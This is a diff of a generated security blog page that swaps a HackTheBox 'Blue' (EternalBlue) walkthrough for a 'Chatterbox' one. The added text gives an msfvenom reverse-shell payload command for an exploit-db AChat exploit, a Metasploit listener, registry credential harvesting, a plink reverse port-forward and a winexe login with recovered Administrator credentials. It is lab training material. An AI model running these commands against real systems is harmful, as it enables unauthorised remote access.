@@ -9,14 +9,14 @@
       
       
       
-        <link rel="canonical" href="https://example.com/Writeups/HackTheBox/Blue/">
+        <link rel="canonical" href="https://example.com/Writeups/HackTheBox/Chatterbox/">
       
       <link rel="icon" href="../../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.2.1, mkdocs-material-7.1.8">
     
     
       
-        <title>Blue - d4rckh</title>
+        <title>Chatterbox - d4rckh</title>
       
     
     
@@ -73,11 +73,6 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
-        
-        <a href="#metasploit-way" class="md-skip">
-          Skip to content
-        </a>
-      
     </div>
     <div data-md-component="announce">
       
@@ -104,7 +99,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Blue
+              Chatterbox
             
           </span>
         </div>
@@ -426,6 +421,18 @@
             
   
   
+  
+    <li class="md-nav__item">
+      <a href="../Blue/" class="md-nav__link">
+        Blue
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
     
   
   
@@ -434,25 +441,11 @@
       <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
       
       
-        
-      
       
       <a href="./" class="md-nav__link md-nav__link--active">
-        Blue
-      </a>
-      
-    </li>
-  
-
-          
-            
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../Chatterbox/" class="md-nav__link">
         Chatterbox
       </a>
+      
     </li>
   
 
@@ -476,52 +469,48 @@
               </div>
             
             
-              
-              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
-                <div class="md-sidebar__scrollwrap">
-                  <div class="md-sidebar__inner">
-                    
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-</nav>
-                  </div>
-                </div>
-              </div>
-            
           
           <div class="md-content" data-md-component="content">
             <article class="md-content__inner md-typeset">
               
                 
                 
-                <p>This post will explain the root process of Blue on hackthebox using metasploit and without</p>
-<p>Running a simple nmap scan we can see quite a lot of ports open</p>
-<pre><code>$ nmap -A -T4 -p- 10.10.10.40
+                  <h1>Chatterbox</h1>
+                
+                <p>In this post I will be showing you how to root Chatterbox, as always I will try to not spoonfeed as much as I can. Enjoy.</p>
+<p>I ran an nmap scan against the box but no ports came back, so I decided to a full port scan by adding the <code>-p-</code> flag my nmap command, this revealed 2 ports which were related to AChat.</p>
+<p><img alt="image" src="htb_chatterbox_nmap.png" /></p>
+<p>I did a quick searchsploit search against "AChat" and decided to use this python script: <a href="https://www.exploit-db.com/exploits/36025">https://www.exploit-db.com/exploits/36025</a></p>
+<p>I used the following command to generate my payload and replaced it in the python script</p>
+<pre><code class="language-bash">msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=listeningip LPORT=listeningport -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
 </code></pre>
-<p><img alt="image" src="htb_blue_ports.png" /></p>
-<p>We can see rpc, netbios and microsoft-ds</p>
-<p>On port 445 we can see SMB running, nmap tells us the box runs <code>Windows 7 Professional SP1</code> and that the box is in a workgroup</p>
-<p>Nmap also ran some scripts for us which tells us the hostname and more useful information like if message_signing is enabled (which won't help us in this case, but it's a good thing to know)</p>
-<p><img alt="image" src="htb_blue_scripts.png" /></p>
-<p>As the name suggest this box is probably vulnerable to ms17_010 which is Eternal Blue</p>
-<h1 id="metasploit-way">Metasploit way</h1>
-<p>We can verify that the box is vulnerable using the <code>use auxiliary/scanner/smb/smb_ms17_010</code> metasploit module and setting <code>RHOSTS</code> to <code>10.10.10.40</code></p>
-<p>After verifying this box is vulnerable to eternal blue we can start exploiting it using metasploit's <code>exploit/windows/smb/ms17_010_externalblue</code> module, do not forget to set the host to <code>10.10.10.40</code></p>
-<p>Looking at the options on the metasploit module we can see by default <code>generic/shell_reverse_tcp</code> which is an unstaged payload, it's also a generic shell and it won't result in a meterpreter shell. We could change it to <code>windows/x64/meterpreter/reverse_tcp</code> by changing <code>payload</code> using <code>set</code>. This <strong>will</strong> result in a meterpreter shell, making things easier.</p>
-<blockquote>
-<p><strong>WARNING</strong>: This exploit might crash the target machine.</p>
-</blockquote>
-<p>After getting the meterpreter shell we can check using <code>getuid</code> that we are authority system.</p>
-<h1 id="manual-way">Manual way</h1>
-<p><strong>AutoBlue</strong> is a nice way to exploit eternal blue manually, it is located @ <a href="https://github.com/3ndG4me/autoblue-ms17-010">https://github.com/3ndG4me/autoblue-ms17-010</a> on github. (Just follow the instructions on the readme)</p>
-<blockquote>
-<p><strong>WARNING</strong>: This exploit also might crash the target machine.</p>
-</blockquote>
+<p>Then I used metasploit's <code>exploit/multi/handler</code> module to listen for the shell, do not forget to set the payload to <code>windows/shell_reverse_tcp</code> (I forgot doing this and it took me 30 minutes to figure it out)</p>
+<p>After I got the shell I ran really quick <code>netstat -ano</code> because I was not convinced <code>AChat</code> was the only service running on the machine.</p>
+<p>To my surprise, there was indeed <code>445</code> open which was basically SMB. </p>
+<p>SMB could help us only:
+- If we got credentials
+    - In case of Administrator creds, we could possible get a shell
+- Anonymous login is enabled</p>
+<p>So before port forwarding 445, I decided to do more enumeration.</p>
+<p>I went to the good old hacktricks' checklist which I recommend you check out.</p>
+<p>After few minutes, I got my first credentials within registry, more info here: <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#inside-the-registry">https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#inside-the-registry</a></p>
+<p><img alt="image" src="htb_chatterbox_reg.png" /></p>
+<p>I downloaded plink (<strong>MAKE SURE TO DOWNLOAD THE 32 BIT VERSION</strong>) from <a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">here</a>.</p>
+<p>After downloading it I used python3 to make a http server where I will download plink from.</p>
+<pre><code class="language-bash">$ cd ~/Downloads
+$ python3 -m http.server # You might need to run this as root or specific another port that doesn't need special privs to bind to, by default it uses 8000
+</code></pre>
+<p>On my box I also started ssh using systemctl</p>
+<pre><code class="language-bash">$ sudo systemctl enable ssh
+</code></pre>
+<p>Then using plink on the box I ran the following:</p>
+<pre><code class="language-batch">.\plink.exe -l d4rckh -pw 123123 -R 445:127.0.0.1:445 10.10.XX.XX
+</code></pre>
+<p>(NOTE: Change the username, IP and password so they match with your box)</p>
+<p>From there I ran winexe:</p>
+<pre><code class="language-bash">winexe -U Administrator%Welcome1! //127.0.0.1 “cmd.exe”
+</code></pre>
+<p><img alt="image" src="htb_chatterbox_root.png" /></p>
                 
               
               
@@ -541,7 +530,7 @@
     <nav class="md-footer__inner md-grid" aria-label="Footer">
       
         
-        <a href="../../../Security/Windows/Physical%20Access/Windows%20UAC%20Bypass/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Windows UAC Bypass" rel="prev">
+        <a href="../Blue/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Blue" rel="prev">
           <div class="md-footer__button md-icon">
             <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
           </div>
@@ -550,26 +539,11 @@
               <span class="md-footer__direction">
                 Previous
               </span>
-              Windows UAC Bypass
+              Blue
             </div>
           </div>
         </a>
       
-      
-        
-        <a href="../Chatterbox/" class="md-footer__link md-footer__link--next" aria-label="Next: Chatterbox" rel="next">
-          <div class="md-footer__title">
-            <div class="md-ellipsis">
-              <span class="md-footer__direction">
-                Next
-              </span>
-              Chatterbox
-            </div>
-          </div>
-          <div class="md-footer__button md-icon">
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
-          </div>
-        </a>
       
     </nav>
   
